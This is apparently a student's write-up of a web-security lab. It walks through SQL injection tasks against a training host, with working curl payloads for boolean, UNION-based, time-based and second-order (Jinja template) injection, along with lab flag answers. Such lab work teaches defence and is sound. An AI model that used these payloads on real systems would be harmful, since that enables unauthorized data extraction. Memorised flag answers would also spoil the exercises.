# SQL, noSQL Injection


## Task 0. SQLi - Basic Injection Discovery

The first step in exploiting SQL injection vulnerabilities is to identify which parameters are vulnerable.
Your goal is to identify which parameters in the application's web pages are susceptible to SQL injection attacks. For that you should:

- Access the machine `cyber_websec_0x01` through the VPN.
- Navigate to: http://web0x01.hbtn/a3/sql_injection/. (dont forget to edit your /etc/hosts)
- Search for the vulnerable paramters.
$ `echo "paramters_name" > 0-vuln.txt`

1. Start by navigating through the application's various pages.
2. Pay special attention to any pages that display data from the database, such as product listings or user profiles.
3. Look for URL parameters, form inputs, or any other input fields where user-supplied data is reflected in the page content or influences the data displayed.
4. Use simple payloads such as a single quote (`'`) or a boolean condition (`' OR '1'='1`) appended to parameters in URLs or input fields.
5. Observe the application's response for any errors, unusual behavior, or changes in the displayed data that indicate a successful injection.


**Solution**:
- start `cyber_webse_0x01`, get IP from "Network Information" button
- start openvpn
- edit /etc/hosts to put the IP address `echo "10.42.95.237 web0x01.hbtn" | sudo tee -a /etc/hosts`
- navigate to [http://web0x01.hbtn/a3/sql_injection/](http://web0x01.hbtn/a3/sql_injection/) with Firefox
- on Firefox start network monitor (Ctrl+Shift+E), select "Network" on the top row and seelect "XHR" on the "filter URLs" row.
- on the web page select Status "Paid"
- observe the network monitor, you will see a request to `http://web0x01.hbtn/a3/sql_injection/?status=paid` with a response of a JSON object containing the list of paid orders.
- right click on the request and select "Edit and Resend"
- in the "Request Body" section, change the value of `status` to `paid' OR '1'='1` and click "Send" (inject **Boolean TRUE**)
- observe the response, you will see a JSON object containing the list of all orders, not just the paid ones.
- right click again on the request and select "Edit and Resend"
- in the "Request Body" section, change the value of `status` to `paid' OR '1'='2` and click "Send" (inject **Boolean FALSE**)
- observe the response, you will see a JSON object containing an empty list of orders, indicating that the injection was successful and the application is vulnerable to SQL injection.
- prepare the answer:
```bash
echo "status" > 0-vuln.txt
git add .
git commit -m "0-vuln.txt"
git push
```


## Task 1. SQLi - Extracting Database Information

Now that you've identified a vulnerable parameter, your next task is to find a `flag` ⛳️:

- Extract information about the database itself:
  - Database `Version`.
  - Tables.

---


Helpful Instructions:

1. To determine the Database Version, Craft a payload that causes the application to reveal the version of the database it's using.

- This might involve using functions like `version()` in MySQL or `@`**`@VERSION`** in Microsoft SQL Server.

2. To identify All Table Names: Modify your payload to extract the names of all tables within the database.

- This will likely require knowledge of database-specific system tables or schemas (e.g., `INFORMATION_SCHEMA.TABLES` in MySQL).


## **Solution**:

- on kali command line run a curl GET request to check the response JSON structure:
```bash
URL="http://web0x01.hbtn/api/a3/sql_injection/all_orders"

curl -sG "$URL" \
  --data-urlencode "status=paid' OR 1=1-- " | jq .
# [
#   [
#     1,
#     "Feb 1, 2023",
#     "Pending",
#     "Maroua",
#     "Maroua@web0x01.hbtn"
#   ],
# ...
#   [
#     24,
#     "April 24, 2023",
#     "Pending",
#     "Maroua",
#     "Maroua@web0x01.hbtn"
#   ]
# ]
```

If we're lucky then we're interogating 5 columns - let's verify this:

```bash
curl -sG "$URL" \
  --data-urlencode "status=paid' UNION SELECT NULL,NULL,NULL,NULL,NULL-- " | jq .
# [
#   [
#     null,
#     null,
#     null,
#     null,
#     null
#   ],
#   [
#     3,
#     "April 3, 2023",
#     "Paid",
#     "Ismail",
#     "Ismail@web0x01.hbtn"
#   ],
# ...
#   [
#     23,
#     "Jan 23, 2023",
#     "Paid",
#     "Yosri",
#     "Yosri@web0x01.hbtn"
#   ]
# ]
```


### What does `UNION SELECT NULL,NULL,NULL,NULL,NULL` do?

The payload was:

```
paid' UNION SELECT NULL,NULL,NULL,NULL,NULL--
```

Let's break it down.

| Part                       | Purpose                                                  |
| -------------------------- | -------------------------------------------------------- |
| `paid`                     | The original status value                                |
| `'`                        | Closes the SQL string containing `paid`                  |
| `UNION`                    | Combines results from two SQL queries                    |
| `SELECT`                   | Creates a second result set                              |
| `NULL,NULL,NULL,NULL,NULL` | Supplies five column values                              |
| `-- `                      | Comments out the remainder of the original SQL statement |

### What the backend might be doing

The application's SQL query might look like this:

```sql
SELECT id, date, status, customer, email
FROM orders
WHERE status = 'paid'
```

When we inject our payload, the resulting SQL becomes approximately:

```sql
SELECT id, date, status, customer, email
FROM orders
WHERE status = 'paid'
UNION
SELECT NULL, NULL, NULL, NULL, NULL
-- '
```


### Why use NULL?

`UNION` requires both queries to return the same number of columns, with compatible data types.

`NULL` is useful because it is compatible with integer, text, and date columns.

If the original query returned five columns but our injected `SELECT` returned only four, the database would reject the UNION.

The successful response confirms that five expressions are accepted by the UNION query.

### How to use this for extracting the database version?

Now we can replace one of those `NULL` values with a SQL function.

For example:

```sql
SELECT NULL, NULL, NULL, version(), NULL
```

Instead of returning five NULLs, this asks the database to return its version in the fourth column.

That fourth column corresponds to the customer field in the JSON output, assuming the same mapping as in the previous response.

### Next command: Extract the database version


```bash
curl -sG "$URL" \
  --data-urlencode "status=paid' UNION SELECT NULL,NULL,NULL,version(),NULL-- " | jq .
# [
#   [
#     null,
#     null,
#     null,
#     "SQLite - FLAG: 559731c45deb90846d745be2192f536a",
#     null
#   ],
# ...
```

```bash
echo "559731c45deb90846d745be2192f536a" > 1-flag.txt
git add .
git commit -m "1-flag.txt"
git push
```

**Note**:
> The response identifies SQLite as the database engine. SQLite doesn't normally implement `version()`, so this appears to be a custom function provided by the challenge. SQLite's native version function is `sqlite_version()`.



### Next step: Enumerate database tables

SQLite stores database schema information in a special table called `sqlite_master` (also accessible as `sqlite_schema`).

We can query it to retrieve table names.

Execute this one command:

```bash
curl -sG "$URL" \
  --data-urlencode "status=paid' UNION SELECT NULL,NULL,NULL,group_concat(name, ', '),NULL FROM sqlite_master WHERE type='table'-- " | jq .

[
  [
    null,
    null,
    null,
    "Orders, RandomTable1, RandomTable2, RandomTable3, RandomTable4, RandomTable5, RandomTable6, RandomTable7, RandomTable8, RandomTable9, RandomTable10, not_me, Users",
    null
  ],
```

What it does:

- `sqlite_master`: accesses SQLite's schema catalog.
- `WHERE type='table'`: selects only table definitions.
- `name`: retrieves each table's name.
- `group_concat(name, ', ')`: combines all table names into one string.
- `UNION SELECT`: injects that string into the fourth output column.


## Task 2. SQLi - Data Exfiltration from a Specific Table

With knowledge of the database structure, your goal is to extract sensitive data from a specific table.\
The target for this exercise is a flag ⛳️ stored within one of the tables you previously identified.

---


Helpful Instructions:

1. Based on your findings from Task 1, choose a table that likely contains the flag.
2. Develop payloads that will allow you to retrieve the contents of the target table.

- This will involve constructing queries that utilize **`UNION`**` `**`SELECT`** statements or other techniques suitable for data exfiltration.


## **Solution**:

We successfully enumerated 13 tables in the SQLite database:

`Orders`, `RandomTable1`, . . . , `RandomTable10`, `not_me`, and `Users`.

For Task 2: SQLi - Data Exfiltration, we need to determine which table contains the flag.

Rather than blindly extracting data from all 13 tables, we'll first inspect their schemas.

### Discover the columns in each table

SQLite stores table definitions in `sqlite_master`, including the original `CREATE TABLE` statements.

Executing this command:

```bash
curl -sG "$URL" \
  --data-urlencode "status=paid' UNION SELECT NULL,NULL,NULL,group_concat(name || ': ' || sql, char(10)),NULL FROM sqlite_master WHERE type='table'-- " | jq .

#[
#  [
#    null,
#    null,
#    null,
#    "Orders: CREATE TABLE Orders (\n    id INTEGER PRIMARY KEY,\n    date TEXT,\n    status TEXT,\n    customer_name TEXT,\n    customer_email TEXT\n)\nRandomTable1: CREATE TABLE RandomTable1 (id INTEGER PRIMARY KEY, value TEXT)\nRandomTable2: CREATE TABLE RandomTable2 (id INTEGER PRIMARY KEY, value TEXT)\nRandomTable3: CREATE TABLE RandomTable3 (id INTEGER PRIMARY KEY, value TEXT)\nRandomTable4: CREATE TABLE RandomTable4 (id INTEGER PRIMARY KEY, value TEXT)\nRandomTable5: CREATE TABLE RandomTable5 (id INTEGER PRIMARY KEY, value TEXT)\nRandomTable6: CREATE TABLE RandomTable6 (id INTEGER PRIMARY KEY, value TEXT)\nRandomTable7: CREATE TABLE RandomTable7 (id INTEGER PRIMARY KEY, value TEXT)\nRandomTable8: CREATE TABLE RandomTable8 (id INTEGER PRIMARY KEY, value TEXT)\nRandomTable9: CREATE TABLE RandomTable9 (id INTEGER PRIMARY KEY, value TEXT)\nRandomTable10: CREATE TABLE RandomTable10 (id INTEGER PRIMARY KEY, value TEXT)\nnot_me: CREATE TABLE not_me (\n    id INTEGER,\n    value TEXT,\n    name TEXT\n)\nUsers: CREATE TABLE Users (\n    id INTEGER PRIMARY KEY,\n    name VARCHAR(120),\n    username VARCHAR(120) UNIQUE,\n    password TEXT\n)",
#     null
#   ],
```

### How it works

- `sqlite_master`: SQLite's internal schema catalog.
- `name`: The table name.
- `sql`: The SQL statement used to create the table, including its column names and types.
- `||`: SQLite's string concatenation operator.
- `char(10)`: A newline character.
- `group_concat(...)`: Combines the schema definitions into one result.
- `UNION SELECT`: Places the schema information into the fourth column of the API response.

We discovered table structures:

```sql
Orders: CREATE TABLE Orders (
    id INTEGER PRIMARY KEY,
    date TEXT,
    status TEXT,
    customer_name TEXT,
    customer_email TEXT
)
RandomTable1: CREATE TABLE RandomTable1 (id INTEGER PRIMARY KEY, value TEXT)
RandomTable2: CREATE TABLE RandomTable2 (id INTEGER PRIMARY KEY, value TEXT)
RandomTable3: CREATE TABLE RandomTable3 (id INTEGER PRIMARY KEY, value TEXT)
RandomTable4: CREATE TABLE RandomTable4 (id INTEGER PRIMARY KEY, value TEXT)
RandomTable5: CREATE TABLE RandomTable5 (id INTEGER PRIMARY KEY, value TEXT)
RandomTable6: CREATE TABLE RandomTable6 (id INTEGER PRIMARY KEY, value TEXT)
RandomTable7: CREATE TABLE RandomTable7 (id INTEGER PRIMARY KEY, value TEXT)
RandomTable8: CREATE TABLE RandomTable8 (id INTEGER PRIMARY KEY, value TEXT)
RandomTable9: CREATE TABLE RandomTable9 (id INTEGER PRIMARY KEY, value TEXT)
RandomTable10: CREATE TABLE RandomTable10 (id INTEGER PRIMARY KEY, value TEXT)
not_me: CREATE TABLE not_me (
    id INTEGER,
    value TEXT,
    name TEXT
)
Users: CREATE TABLE Users (
    id INTEGER PRIMARY KEY,
    name VARCHAR(120),
    username VARCHAR(120) UNIQUE,
    password TEXT
)
```


### Inspecting the `not_me` table

Let's start with `not_me` table because its structure differs from the other tables.

```bash
curl -sG "$URL" \
  --data-urlencode "status=paid' AND 1=0 UNION SELECT NULL,NULL,NULL,name || ': ' || value,NULL FROM not_me-- " | jq .
# [
#   [
#     null,
#     null,
#     null,
#     "FLAG: acc05fbd64eb50cfb692da28efc313e9",
#     null
#   ]
# ]
```

```bash
echo "acc05fbd64eb50cfb692da28efc313e9" > 2-flag.txt
git add .
git commit -m "2-flag.txt"
git push
```


## Task 3. SQLi - Time-Based Blind Injection

In the realm of cybersecurity, not all vulnerabilities are visible or apparent. Blind SQL injection is a prime example of such hidden vulnerabilities.\
In this task, you are challenged to detect and exploit a blind SQL injection vulnerability where the only indication of success is a delayed response from the server.\
Your goal is to craft a `payload` that causes the server to return a `flag` ⛳️ if the query execution takes longer than `5` seconds.

---

\*

Helpful Instructions:

1. Understanding Time-based SQL Injection

- Familiarize yourself with how SQL databases can be manipulated to delay responses using specific functions or commands.

2. Your payload should incorporate a command that causes the server to wait or sleep for a specified duration (more than 5 seconds) before responding.

- The exact function or command will depend on the database in use (e.g., `SLEEP()` for MySQL, `pg_sleep()` for PostgreSQL, `WAITFOR DELAY` for SQL Server).

3. Observing Responses:

- Use tools like Burp Suite to send your payloads and accurately measure the response times. This will help you fine-tune your payload to achieve the desired delay.

4. Iterative Testing:

- You may not get it right on the first try. Use an iterative approach, adjusting your payload based on response times, to zero in on a successful exploitation technique.

\*


## **Solution**:

### Test whether the database supports sleep()

We already know the database is SQLite.

SQLite doesn't provide a built-in `sleep()` function, unlike MySQL. However, the challenge has already demonstrated a custom `version()` function, so it might also implement `sleep()`.

We'll test that first.

Executing:

```bash
curl -sS -G "$URL" \
  --data-urlencode "status=paid' AND (SELECT sleep(6)) IS NULL-- " \
  -w '\nHTTP: %{http_code} | Time: %{time_total}s\n'
# [[1,"c160b23374436bb938ac95a9f5bbf7ed","Paid","TIMOUT FLAG","FLAG@web0x01.hbtn"]]
#
# HTTP: 200 | Time: 6.066384s
```


### What are we doing?

The injected expression is:

```sql
paid' AND (SELECT sleep(6)) IS NULL--
```

- `paid'`: Closes the original SQL string.
- `AND`: Adds another condition.
- `SELECT sleep(6)`: Attempts to introduce a 6-second delay.
- `IS NULL`: Makes the expression a Boolean condition.
- `-- `: Comments out the remaining original SQL.

We use a scalar subquery to encourage SQLite to evaluate the sleep function once rather than once per matching order.

The `curl -w` option measures the total HTTP response time.

### Possible outcomes

| Result                   | Meaning                                 |
| ------------------------ | --------------------------------------- |
| Approximately 6 seconds  | **Strong indication that `sleep(6)` works** |
| Error mentioning `sleep` | Function probably isn't available       |
| Immediate HTTP 200       | No evidence of the intended delay       |
| Flag in response         | **Task completed**                          |

```bash
echo c160b23374436bb938ac95a9f5bbf7ed > 3-flag.txt
git add .
git commit -m "3-flag.txt"
git push
```


## Task 4. SQLi - Second-Order Blind Injection

Second-order SQL injection requires a nuanced approach, as the payload you inject at one point is executed at another, often without direct feedback.\
This task involves submitting a payload through a registration form that seems benign until it is processed during login, revealing a flag based on a jinja error where `FLAG` is an accessible variable.\
Your goal is to find the `flag` ⛳️.

- Target URL (Initial Input):
  - Endpoint: `http://web0x01.hbtn/api/a3/sql_injection/second_order/register`
  - Method: `POST`
  - Content-Type: `JSON`
  - Body: `Example`

    {"username": "yosri", "name": "Yosri", "password": "password123"}
- Target URL (Trigger):
  - Endpoint: `http://web0x01.hbtn/api/a3/sql_injection/second_order/login`
  - Method: `POST`
  - Content-Type: `JSON`
  - Body: `Example`

    {"username": "yosri", "password": "password123"}

---

\*

Helpful Instructions:

1. Consider how your payload can be crafted to remain dormant until triggered.
- This might involve manipulating user data that's later used in a SQL query during login.
2. Since you won't see direct output from your payload, think about how you can use timing attacks or monitor application behavior changes to infer success.
2. Use tools like Burp Suite to carefully observe the application's responses and time delays when interacting with the stored payload.
3. Be prepared to refine your payload based on feedback. This might require several attempts to fine-tune how your payload is triggered and detected.

\*


## **Solution**:

### Understand the vulnerability

This task is different from the previous ones.

In a second-order injection, the malicious input is stored first and executed later.

1\. Registration

Store a payload in the `name` field.

2\. Database

The application saves the payload as ordinary user data.

3\. Login

The application retrieves the stored value and potentially evaluates it using Jinja.

4\. Injection triggers

If Jinja evaluates the stored input, we may be able to access the `FLAG` variable.

Because the challenge explicitly mentions Jinja, we'll first test for Server-Side Template Injection (SSTI) using:

```
{{7*7}}
```

If Jinja evaluates this expression, the result will be `49` rather than the literal `{{7*7}}`.

### Register a test account

Execute this command to add new user with a payload in the `name` field:

```bash
curl -sS -X POST \
  'http://web0x01.hbtn/api/a3/sql_injection/second_order/register' \
  -H 'Content-Type: application/json' \
  -d '{"username":"ssti_probe_1026","name":"{{7*7}}","password":"password123"}' \
  | jq .

# {
#   "message": "User created successfully",
#   "success": true
# }
```

We're deliberately putting the payload inside `name`, while using ordinary values for `username` and `password`.


### Trigger the second-order injection

Now we'll log in using the same account.

Execute this command:

```bash
curl -sS -i -X POST \
  'http://web0x01.hbtn/api/a3/sql_injection/second_order/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"ssti_probe_1026","password":"password123"}'

#HTTP/1.1 200 OK
#Server: nginx/1.22.1
#Date: Mon, 26 Oct 2026 20:30:39 GMT
#Content-Type: application/json
#Content-Length: 107
#Connection: keep-alive
#Vary: Cookie
#Set-Cookie: session=q2v4JKvBHIQ9G2kqWZDRCCcCmLSOahlHcjtOwbdoRGU.-PkttFB-KRtqP0I6Kgy0r3G9rFs; HttpOnly; Path=/
# X-XSS-Protection: 0

# {"message":{"html":"<h1>Welcome Mr 49</h1>","name":"{{7*7}}","username":"ssti_probe_1026"},"success":true}
```

### What are we testing?

When the application processes the login, it may retrieve the stored `name` and insert it into a Jinja template.

We're looking for one of three outcomes:

| Response    | Interpretation |
| ----------- | -------------- |
| `49`        | **Jinja evaluated `{{7*7}}`, confirming template injection** |
| `{{7*7}}`   | The expression was returned literally                                                    |
| Jinja error | The application reached template processing, and the error may reveal useful information |

We use `curl -i` to display the HTTP status and response headers as well as the body, because the challenge specifically mentions a Jinja error.


Notice the difference:

- `name`: `{{7*7}}` is the original value stored in the database.
- `html`: `Welcome Mr 49` is the result after Jinja evaluated that expression.

This proves the application evaluates stored user input as Jinja template code during login.

### Access the FLAG variable

The task description gives us an important clue: `FLAG` is accessible in the Jinja template context.

Jinja allows variables to be evaluated using:

```sql
{{ FLAG }}
```

Instead of performing arithmetic, we'll try to render the value of `FLAG` directly by registering a new account with `{{ FLAG }}` in the `name` field.

```bash
curl -sS -X POST \
  'http://web0x01.hbtn/api/a3/sql_injection/second_order/register' \
  -H 'Content-Type: application/json' \
  -d '{"username":"ssti_flag_1026","name":"{{ FLAG }}","password":"password123"}' \
  | jq .

# {
#   "message": "User created successfully",
#   "success": true
# }
```

### Trigger the stored payload

Now log in with the account we just created to get the flag:

```bash
curl -sS -X POST \
  'http://web0x01.hbtn/api/a3/sql_injection/second_order/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"ssti_flag_1026","password":"password123"}' \
  | jq .

# {
#   "message": {
#     "html": "<h1>Welcome Mr 6d2261977473a42bb17b9ea982c452aa</h1>",
#     "name": "{{ FLAG }}",
#     "username": "ssti_flag_1026"
#   },
#   "success": true
# }
```

```bash
echo "6d2261977473a42bb17b9ea982c452aa" > 4-flag.txt
git add .
git commit -m "4-flag.txt"
git push
```

